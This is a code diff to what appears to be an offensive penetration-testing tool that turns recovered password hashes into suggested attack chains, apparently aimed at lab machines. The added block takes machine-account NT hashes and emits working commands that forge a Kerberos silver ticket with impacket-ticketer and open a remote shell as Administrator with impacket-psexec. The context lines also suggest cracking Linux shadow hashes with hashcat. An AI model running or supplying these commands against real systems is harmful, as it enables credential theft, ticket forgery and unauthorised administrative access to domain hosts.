@@ -590,6 +590,35 @@ def run(report, store, ui=None):
             crit=5, conf=0.8, ready=0.7, prox=0.6,
             commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
 
+    # iter-36: R-SILVER - machine account NT hash (HOSTNAME$ user) can
+    # forge a silver ticket for that computer's SPNs (cifs/host/http/
+    # ldap/rpcss). More common than krbtgt on lab boxes because any
+    # LOCAL SYSTEM access on a domain-joined host yields the machine
+    # hash from SECURITY hive dumps.
+    silver_seen = set()
+    for h, occurrences in e.nt.items():
+        for huser, hsrc, hln in occurrences:
+            if not huser or not huser.endswith("$"):
+                continue
+            # Strip potential DOMAIN\ prefix then trailing $, so
+            # 'HTB\WEB01$' -> 'WEB01'.
+            host_short = huser.split("\\")[-1].rstrip("$")
+            if not host_short or host_short.lower() in silver_seen:
+                continue
+            silver_seen.add(host_short.lower())
+            _dom_sv = store.dominant_domain() or "<DOM>"
+            chains.append(Chain("R-SILVER", "silver ticket",
+                f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
+                crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
+                commands=[
+                    f"# Look up domain SID (impacket-lookupsid <DC>/<u>:<p>@<DC>)",
+                    f"impacket-ticketer -nthash {h} -domain-sid <S-1-5-21-...> "
+                    f"-domain {_dom_sv} -spn cifs/{host_short}.<dom> Administrator",
+                    f"export KRB5CCNAME=Administrator.ccache",
+                    f"impacket-psexec -k -no-pass {_dom_sv}/Administrator@{host_short}.<dom>",
+                ], src=hsrc, line=hln))
+            break
+
     # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
     # ntds.dit + SYSTEM). One command forges an Administrator TGT for the
     # domain; no network re-auth needed. Highest-value chain when present.
